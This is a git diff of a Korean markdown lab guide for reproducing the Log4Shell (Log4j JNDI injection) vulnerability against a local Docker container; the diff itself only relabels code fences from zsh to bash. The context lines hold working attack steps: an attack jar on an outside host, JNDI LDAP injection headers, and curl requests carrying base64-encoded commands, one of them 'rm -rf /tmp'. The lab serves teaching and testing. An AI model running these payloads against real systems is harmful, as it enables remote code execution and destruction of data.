@@ -6,7 +6,7 @@
 
 ### 1. 취약 서버(1번탭)
 
-```zsh
+```bash
 docker start vulnerable-app
 docker logs -f vulnerable-app
 ```
@@ -23,7 +23,7 @@ docker logs -f vulnerable-app
 
 > 3번 탭 새로 하나 띄우고 `Ctrl+Shift+T`
 
-```zsh
+```bash
 ssh cloud
 java -jar /shane/attack.jar -i 146.56.44.96 -p 8888
 ```
@@ -40,7 +40,7 @@ java -jar /shane/attack.jar -i 146.56.44.96 -p 8888
 
 ### Log4J가 JNDI LookUp을 하고 있는지 확인
 
-```zsh
+```bash
 GET: localhost:9999
 Header Key: X-Api-Version
 Header Value: ${jndi:java:version}
@@ -52,7 +52,7 @@ Header Value: ${jndi:java:version}
 
 ### LDAP 서버로 요청을 보내는지 확인
 
-```zsh
+```bash
 GET: localhost:9999
 Header Key: X-Api-Version
 Header Value: ${jndi:ldap://146.56.44.96:1389/argonet}
@@ -60,7 +60,7 @@ Header Value: ${jndi:ldap://146.56.44.96:1389/argonet}
 
 > Postman 사용불가능할 경우 Terminal에서 curl로 요청
 >
-> ```zsh
+> ```bash
 > curl 127.0.0.1:9999 -H 'X-Api-Version: ${jndi:ldap://146.56.44.96:1389/argonet}'
 > ```
 
@@ -72,7 +72,7 @@ Header Value: ${jndi:ldap://146.56.44.96:1389/argonet}
 
 ### 쿼리로 보낼 커맨드 Base64로 인코딩
 
-```zsh
+```bash
 echo -n 'touch /tmp/argonet.december-table' | base64
 ```
 
@@ -80,7 +80,7 @@ echo -n 'touch /tmp/argonet.december-table' | base64
 
 ### 취약 서버에 명령어 전송
 
-```zsh
+```bash
 PostMan으로 헤더에 X-Api-Version value 넣어서 요청 혹은 curl로 요청
 curl 127.0.0.1:9 -H 'X-Api-Version: ${jndi:ldap://146.56.44.96:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9hcmdvbmV0LmRlY2VtYmVyLXRhYmxl}'
 ```
@@ -99,7 +99,7 @@ curl 127.0.0.1:9 -H 'X-Api-Version: ${jndi:ldap://146.56.44.96:1389/Basic/Comman
 
 UTC 시간을 확인시켜 준다.
 
-```zsh
+```bash
 date -u
 ```
 
@@ -111,7 +111,7 @@ date -u
 
 명령어 만들기 위해 새로운 창의 Terminal에서 tmp 폴더 삭제 명령어 인코딩 후 공격 코드 전송
 
-```zsh
+```bash
 echo -n 'rm -rf /tmp' | base64
 ```
 
@@ -135,7 +135,7 @@ echo -n 'rm -rf /tmp' | base64
 
 일단 vulnerable-app 다시 실행 해 준다.
 
-```zsh
+```bash
 docker start vulnerable-app
 ```
 
@@ -143,7 +143,7 @@ docker start vulnerable-app
 >
 > 안그러면 서버가 계속 죽는다.
 >
-> ```zsh
+> ```bash
 > mkdir tmp
 > docker cp ./tmp vulnerable-app:/
 > docker start vulnerable-app
@@ -151,7 +151,7 @@ docker start vulnerable-app
 
 `docker logs -f vulnerable-app ` 해서 서버 잘 뜬거 확인 후
 
-```zsh
+```bash
 git clone git@github.com:fullhunt/log4j-scan.git
 ```
 
@@ -166,7 +166,7 @@ python3 log4j-scan.py -u "http://gaia.best"
 
 이번에는 취약 서버 확인
 
-```zsh
+```bash
 python3 log4j-scan.py -u "http://localhost:9999"
 ```
 
